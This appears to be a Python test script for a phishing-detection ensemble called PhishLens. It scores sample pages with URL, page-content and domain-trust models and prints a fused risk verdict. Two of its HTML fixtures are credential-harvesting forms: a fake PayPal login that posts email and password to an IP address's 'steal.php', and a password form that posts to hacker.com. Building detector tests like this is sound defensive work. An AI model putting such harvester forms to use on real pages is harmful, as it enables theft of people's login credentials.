"""
PhishLens — Stage 5 Tri-Component Architecture Verification
============================================================
Tests the multi-component fusion engine:
  - Component 1: Multi-Source URL HistGBT (trained on 388k URLs)
  - Component 2: DOM Content HistGBT (trained on 235k DOM profiles)
  - Component 3: Dynamic Trust Layer (Tranco + RDAP domain age)
"""

import sys
sys.path.insert(0, "backend")

import joblib
import numpy as np
from pathlib import Path
from urllib.parse import urlparse
from features_14 import extract_url_features_14, FEATURE_14, AVAILABLE_IN_EXTENSION
from features_dom import extract_dom_features_from_html, DOM_FEATURE_COLS
from trust import compute_trust, _tranco
_tranco._load()

MODEL_DIR = Path("backend/data/models")
url_model_pkg = joblib.load(MODEL_DIR / "phishlens_multisource_histgbt.pkl")
dom_model_pkg = joblib.load(MODEL_DIR / "phishlens_dom_histgbt.pkl")

url_model = url_model_pkg["model"]
dom_model = dom_model_pkg["model"]

print("=" * 80)
print("PHISHLENS STAGE 5: TRI-COMPONENT ENSEMBLE VERIFICATION")
print("=" * 80)

# Build realistic test cases
h_google = "\n".join(["<!DOCTYPE html>", "<html>", "<head><title>Google Search</title></head>", "<body><h1>Google</h1>"] + ["<div><a href='/help'>Help</a></div>"] * 500 + ["<form action='/search'><input name='q'/><input type='submit'/></form></body></html>"])
h_univ   = "\n".join(["<!DOCTYPE html>", "<html>", "<head><title>Johannes Gutenberg University Mainz</title></head>", "<body><h1>JGU Mainz</h1><p>Academic portal...</p>"] + ["<div><a href='/department'>Dept</a></div>"] * 600 + ["</body></html>"])
h_phish1 = """<!DOCTYPE html><html><head><title>Account Verification</title></head><body><h1>Verify PayPal</h1><form action="http://103.114.163.238/steal.php" method="POST"><input type="text" name="email"/><input type="password" name="pass"/><input type="submit" value="Log In"/></form></body></html>"""
h_phish2 = """<!DOCTYPE html><html><head><title>Document Download</title></head><body><form action="http://hacker.com/post" method="POST"><input type="password"/><input type="submit"/></form></body></html>"""

test_cases = [
    {
        "name": "1. Legitimate High-Traffic Domain (google.com)",
        "url": "https://www.google.com/search?q=security",
        "html": h_google,
    },
    {
        "name": "2. Legitimate University Site (uni-mainz.de)",
        "url": "https://www.uni-mainz.de/",
        "html": h_univ,
    },
    {
        "name": "3. Classic Credential Harvester (paypal-verify.account-security.xyz)",
        "url": "https://paypal-verify.account-security.xyz/login.php",
        "html": h_phish1,
    },
    {
        "name": "4. Deep Obfuscated Phish (locateme.co.nz/...)",
        "url": "https://locateme.co.nz/wp-content/jam/ichiemagiksouthwest123.html",
        "html": h_phish2,
    },
]

for tc in test_cases:
    print(f"\n--- {tc['name']} ---")
    u = tc["url"]
    h = tc["html"]
    
    # 1. URL Model proba
    f_url = extract_url_features_14(u)
    v_url = np.full((1, len(FEATURE_14)), np.nan, dtype=np.float64)
    feat_idx = {col: i for i, col in enumerate(FEATURE_14)}
    for k in AVAILABLE_IN_EXTENSION:
        v_url[0, feat_idx[k]] = f_url.get(k, np.nan)
    p_url = float(url_model.predict_proba(v_url)[0, 1])

    # 2. DOM Model proba
    f_dom = extract_dom_features_from_html(h, page_url=u)
    v_dom = np.array([[f_dom[k] for k in DOM_FEATURE_COLS]], dtype=np.float64)
    p_dom = float(dom_model.predict_proba(v_dom)[0, 1])

    # 3. Trust Score
    host = urlparse(u).hostname or ""
    t_score, trust_signals = compute_trust(host, has_https=u.startswith("https"))

    # 4. Tri-Component Fusion
    raw_risk = p_url * 0.35 + p_dom * 0.45 + (1.0 - t_score) * 0.20
    
    # Trust dampening
    if t_score > 0.0:
        raw_risk *= (1.0 - t_score * 0.60)
        
    print(f"  Target URL: {u[:65]}")
    print(f"  Component 1 (Multi-Source URL Model P_phish) : {p_url:.4f}")
    print(f"  Component 2 (DOM Content Model P_phish)       : {p_dom:.4f}")
    print(f"  Component 3 (Dynamic Trust Score)             : {t_score:.4f} (Tranco Rank: {trust_signals.get('tranco_rank') or 'unranked'})")
    verdict = "PHISHING (High Risk)" if raw_risk >= 0.50 else "LEGITIMATE (Safe)"
    print(f"  -> FINAL ENSEMBLE RISK SCORE                  : {raw_risk:.4f} => {verdict}")
